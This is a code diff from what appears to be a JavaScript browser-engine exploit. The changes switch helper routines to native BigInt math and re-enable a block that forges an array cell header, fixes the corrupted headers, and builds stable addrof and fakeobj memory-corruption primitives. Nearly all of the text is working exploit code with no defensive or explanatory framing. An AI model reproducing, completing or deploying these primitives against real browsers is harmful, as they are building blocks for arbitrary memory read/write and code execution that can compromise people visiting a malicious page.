@@ -406,13 +406,13 @@ var VM_PROT_EXECUTE = 0x4
 // constant added to double JSValues
           const kBoxedDoubleOffset = 0x0002000000000000n;
           function boxDouble(d) {
-            return d - kBoxedDoubleOffset;
+            return d + kBoxedDoubleOffset;
           }
           function unboxDouble(d) {
             return d - kBoxedDoubleOffset;
           }
           // the structure ID is wrong, but we'll fix it :)
-          let doubleArrayCellHeader = new Int64("0x0108230700000000").asJSValue();
+          let doubleArrayCellHeader = new Int64(0x0108230700000000).asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -461,12 +461,10 @@ var VM_PROT_EXECUTE = 0x4
               return;
             }
             const kSentinel = 1333.337;
-              //var kSentinel = 1333.337;
             let offset = -1;
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
-                //port.postMessage(new Int64.fromDouble(unboxDouble(new Int64(a1[i]).asDouble())))
               if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
                 offset = i;
                 break;
@@ -491,34 +489,25 @@ var VM_PROT_EXECUTE = 0x4
             };
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString());
-            //port.postMessage("obj @ " + addrof({}));
-            /*hope we dont crash or have a gc from here on out...
-            let obj = {
-              jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
-              fakeButterfly: a0
-            };
-            
-            let addr = addrof(obj);
-            port.postMessage("obj @ " + addr.toString());
-            port.postMessage(typeof(addr) +"vs"+typeof(new Int64("0x10")))
+            port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
-            let fakeArr = fakeobj(Add(addr,new Int64("0x10"))); //no way around this im forced to use bigint for fakeobj :(
+            let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
-            doubleArrayCellHeader = Sub(Int64.fromDouble(fakeArr[0]),new Int64("0x1"));
+            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
             // fix broken cell header
-            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
             // grab a real butterfly pointer
-            let doubleArrayButterfly = new Int64.fromDouble(fakeArr[1]);
+            let doubleArrayButterfly = float2bigint(fakeArr[1]);
             // fix other broken cell header
             obj.fakeButterfly = b0;
-            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
+            fakeArr[0] = bigint2float(doubleArrayCellHeader);
             // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = new Int64(doubleArrayCellHeader).asDouble();
+            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
             obj.fakeButterfly = a1;
-            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
             obj.fakeButterfly = b1;
-            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
+            fakeArr[1] = bigint2float(doubleArrayButterfly);
             fakeobj = (addr) => {
               a1[0] = new Int64(addr).asDouble();
               return b1[0];
@@ -527,7 +516,7 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
             }
-            */
+            
             port.postMessage("We got stableish addrof and fakeobj");
             
           }
